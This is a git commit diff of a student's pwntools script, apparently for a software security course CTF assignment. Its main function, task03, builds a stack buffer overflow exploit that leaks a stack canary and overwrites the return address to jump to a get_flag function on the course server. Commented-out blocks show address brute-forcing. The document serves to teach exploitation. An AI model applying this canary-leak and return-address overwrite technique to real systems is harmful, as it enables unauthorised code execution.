47a24fc018b8c45bf76309b8fb979cbfdb2b81da
Vegard <Vegard.berge8@gmail.com>
2021-09-14 13:25:55 +0200

    Hacking complete!

--- assigment1/scripts.py
+++ assigment1/scripts.py
@@ -1,8 +1,9 @@
-import time
+import itertools
 
 from pwn import *
 
 url = 'ctf21.softwaresecurity.no'
+
 
 def task00(port: int):
     conn = remote(url, port)
@@ -14,6 +15,7 @@ def task00(port: int):
     print(conn.recvline())
     conn.close()
 
+
 def task01(port: int):
     conn = remote(url, port)
     print(conn.recvline())
@@ -21,6 +23,7 @@ def task01(port: int):
     conn.sendline(send)
     print(conn.recvall())
     conn.close()
+
 
 def task02(port: int):
     conn = remote(url, port)
@@ -43,50 +46,75 @@ def task02(port: int):
     print(conn.recvline())
     conn.close()
 
+
 def task03(port: int):
     conn = remote(url, port)
     print(conn.recvline())
-    #print(conn.recvline())
     first = b'1' * 32
-    pt0 = b'a' * 8
-    canari_addr = p64(0x7fffffffe098)
-    # dfe8
-    # dd08
-    second = p64(0x4010f0)
-    getFlag = p64(0x4011d6)
+    thirty_two_bytes = p64(0x01) * 4
+    # buffer begins eca0
+    get_flag_Addr = p64(0x00000000004011d6)
 
-    canari_Val = "0x7fffffff"  # e098"
-    while(True):
-        # todo
-        current_try = ""
-        numb = "012345678abcdef"
-        second = "def012"
-        hex_field = "123456789abcdef"
-        for x in second:
-            for y in second:
-                for z in hex_field:
-                    current_try = x+y+z
-                    print(current_try)
-                    canary_try = canari_Val+current_try+'8'
-                    print(f"Canari try {canary_try}")
-                    #print(f"payload is then {first+str.encode(canary_try)}")
+    possible = list(map(''.join, itertools.product('0123456789abcdef', repeat=2)))
 
-                    print(p64(0x01)+p64(int(canary_try, 16), endian='big'))
-                    conn.send(p64(0x01)+p64(int(canary_try, 16), endian='big'))
-                    time.sleep(0.3)
+    #buffer found from bf attack that buffer starts at:
+    buffer_start = p64(0x00007fffffffeca0)
+    # pt_0 = 00007fffffffecbc
+    # canari = 00007fffffffeccc med verdien 55123e1d30298c00
 
-                    if conn.can_recv():
-                        print("***************")
-                        print(f"CurrentTry was {canary_try}")
-                        print(conn.recvall())
-                        print('***************')
+    """
+    for first in range(len(possible)):
+        for second in range(0, len(possible)):
+            string_ = "00007fffffff" + "ec"+ possible[second]
+            bruteforce = p64(int(string_, 16))
+            combined_output = b'a' * 32 + bruteforce
+            # print(f"I´ve sendt this: {bruteforce}")
+            conn.sendline(combined_output)
+            output = (conn.recvline().decode().strip())
 
-                        break
-    # what = p64(0x8949ed31fa1e0ff3)
+            if output != "0":
+                print(f" {output} with this {string_}")
+            try:
+                conn.sendline(combined_output)
+            except:
+                print("fail!")
+                conn = connect(url, 7003)
+                conn.recvline()
+            # print(output)
+            conn.recvline()
+
+    values = ""
+    """
+    list_of_possibles = []
+    """
+        for x in range(32):
+            address_space = p64(0x00007fffffffecc0 + 8 * x)
+            conn.sendline(b'a'*32 + address_space)
+            list_of_possibles.append(address_space)
+            conn.recvline()
+            # print(f"possible canari: {conn.recvline() } \n at adress {address_space}")
+            conn.recvline()
+    """
+    conn.sendline(b'a'*32 + p64(0x00007fffffffecc8))
+    canary = int(conn.recvline().strip(), 16)
+
+    payload = b'q' + b'a'*31 + get_flag_Addr + p64(canary) + p64(0x0) + get_flag_Addr
+    conn.sendline(payload)
+    print(conn.recvline())
+    print(conn.recvline())
+    print(conn.recvline())
+
+
+def test(port: int):
+    conn = remote(url, port)
+    print(conn.recvline())
+
+    while True:
+        conn.send(b'1' * 32 + b'')
 
 
 if __name__ == '__main__':
-    #task00(7000)
-    #task01(7001)
-    #task02(7002)
+    # task00(7000)
+    # task01(7001)
+    # task02(7002)
     task03(7003)
